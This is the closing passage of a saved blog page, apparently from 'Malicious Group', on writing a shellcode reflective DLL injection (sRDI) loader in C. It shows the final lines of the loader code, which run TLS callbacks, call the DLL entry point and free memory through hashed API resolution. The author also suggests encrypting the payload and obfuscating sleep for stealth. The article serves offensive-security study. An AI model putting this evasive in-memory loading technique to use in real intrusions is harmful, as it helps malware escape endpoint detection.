          <td id="file-srdi_main-c-L166" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="166"></td>
          <td id="file-srdi_main-c-LC166" class="blob-code blob-code-inner js-file-line">        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir-&gt;<span class="pl-smi">AddressOfCallBacks</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L167" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="167"></td>
          <td id="file-srdi_main-c-LC167" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span>(; *callback; callback++)</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L168" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="168"></td>
          <td id="file-srdi_main-c-LC168" class="blob-code blob-code-inner js-file-line">            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L169" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="169"></td>
          <td id="file-srdi_main-c-LC169" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L170" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="170"></td>
          <td id="file-srdi_main-c-LC170" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L171" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="171"></td>
          <td id="file-srdi_main-c-LC171" class="blob-code blob-code-inner js-file-line">    DLLEntry DllEntry = (DLLEntry)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">AddressOfEntryPoint</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L172" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="172"></td>
          <td id="file-srdi_main-c-LC172" class="blob-code blob-code-inner js-file-line">    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L173" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="173"></td>
          <td id="file-srdi_main-c-LC173" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L174" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="174"></td>
          <td id="file-srdi_main-c-LC174" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_free_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtFreeVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L175" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="175"></td>
          <td id="file-srdi_main-c-LC175" class="blob-code blob-code-inner js-file-line">    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L176" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="176"></td>
          <td id="file-srdi_main-c-LC176" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_nt_free_virtual_memory</span>(((HANDLE) -<span class="pl-c1">1</span>), &amp;dll_bytes, &amp;dll_image_size, MEM_RELEASE);</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L177" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="177"></td>
          <td id="file-srdi_main-c-LC177" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L178" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="178"></td>
          <td id="file-srdi_main-c-LC178" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-srdi_main-c-L179" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="179"></td>
          <td id="file-srdi_main-c-LC179" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/6b8a3004ffd348630897211fc2d656e5/raw/984b62b238750eeb9a783064a76d4cae0b696201/srdi_main.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/6b8a3004ffd348630897211fc2d656e5#file-srdi_main-c">
          srdi_main.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><p>Then once we rebuild and execute the loader, we can see that our sRDI was able to load the DLL from a header file instead of pulling a DLL from on-disk or over the network.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-20.png" class="kg-image" alt="" loading="lazy" width="2000" height="1267" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-20.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-20.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-20.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-20.png 2400w" sizes="(min-width: 720px) 720px"></figure><hr><p>And with that, I am done showing you code examples. &nbsp;However, this code still has a lot of optimizations that could be done to make it more stealthy and evasive, like encrypting the DLL bytes in the header file, and decrypting before execution... or adding some sleep obfuscation to the DLL itself, etc...</p><p>I hope this paper gives you a decent understanding about how you can turn the standard Windows API into Native code, how to use function obfuscation, function name hashing, and how to reflectively load a DLL into memory.</p>
            </section>

        </article>

    
                <div class="gh-comments gh-read-next gh-canvas">
            <section class="gh-pagehead">
                <h4 class="gh-pagehead-title">Comments (<span>0</span>)</h4>
            </section>
            
        <div id="ghost-comments-root"><iframe title="comments-frame" frameborder="0" style="width: 100%; height: 288px;" src="./Writing your own RDI _sRDI loader using C and ASM_files/saved_resource.html"></iframe><iframe data-frame="admin-auth" src="./Writing your own RDI _sRDI loader using C and ASM_files/saved_resource(1).html" title="auth-frame" style="display: none;"></iframe></div><script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/comments-ui.min.js.download" data-ghost-comments="https://blog.malicious.group/" data-api="https://malicious-group.ghost.io/ghost/api/content/" data-admin="https://malicious-group.ghost.io/ghost/" data-key="c6d4ec113710d11060a6072be3" data-styles="https://cdn.jsdelivr.net/ghost/comments-ui@~0.12/umd/main.css" data-title="" data-count="false" data-post-id="642c362b06a458003d49be71" data-sentry-dsn="" data-color-scheme="auto" data-avatar-saturation="60" data-accent-color="#f14668" data-app-version="0.12" data-comments-enabled="all" data-publication="Malicious Group" crossorigin="anonymous"></script>
    
        </div>
</main>

    <footer class="gh-foot gh-outer">
        <div class="gh-foot-inner gh-inner">
                <section class="gh-subscribe">
                    <h3 class="gh-subscribe-title">Subscribe to Malicious Group</h3>
                        <div class="gh-subscribe-description">Don't miss out on the latest news. Sign up now to get access to the library of members-only articles.</div>
                    <button class="gh-subscribe-btn gh-btn gh-portal-close" data-portal="signup"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M3.33332 3.33334H16.6667C17.5833 3.33334 18.3333 4.08334 18.3333 5.00001V15C18.3333 15.9167 17.5833 16.6667 16.6667 16.6667H3.33332C2.41666 16.6667 1.66666 15.9167 1.66666 15V5.00001C1.66666 4.08334 2.41666 3.33334 3.33332 3.33334Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
    <path d="M18.3333 5L9.99999 10.8333L1.66666 5" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Subscribe now</button>
                </section>

            <nav class="gh-foot-menu">
                <ul class="nav">
    <li class="nav-sign-up"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#/portal/">Sign up</a></li>
</ul>

            </nav>

            <div class="gh-copyright">
                    Malicious Group ¬© 2023. Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
            </div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script src="./Writing your own RDI _sRDI loader using C and ASM_files/main.min.js.download"></script>
<script src="./Writing your own RDI _sRDI loader using C and ASM_files/tocbot.min.js.download"></script>
<script>
    tocbot.init({
        // Where to render the table of contents.
        tocSelector: '.gh-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.gh-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3, h4',
        // Ensure correct positioning
        hasInnerContainers: true,
    });
</script>
    <script>
        const progressBar = document.querySelector('.reading-progress');

        function updateProgress() {
            const totalHeight = document.body.clientHeight;
            const windowHeight = document.documentElement.clientHeight;
            const position = window.scrollY;
            const progress = position / (totalHeight - windowHeight) * 100;
            progressBar.setAttribute('value', progress);
            requestAnimationFrame(updateProgress);
        }

        requestAnimationFrame(updateProgress);
    </script>





<div id="ghost-portal-root"><iframe data-testid="portal-trigger-frame" title="portal-trigger" frameborder="0" class="gh-portal-triggerbtn-iframe" style="z-index: 3999998; position: fixed; bottom: 0px; right: 0px; width: 185px; max-width: 500px; height: 98px; animation: 250ms ease 0s 1 normal none running animation-bhegco; transition: opacity 0.3s ease 0s; overflow: hidden;" src="./Writing your own RDI _sRDI loader using C and ASM_files/saved_resource(2).html"></iframe></div><div id="sodo-search-root"></div></body></html>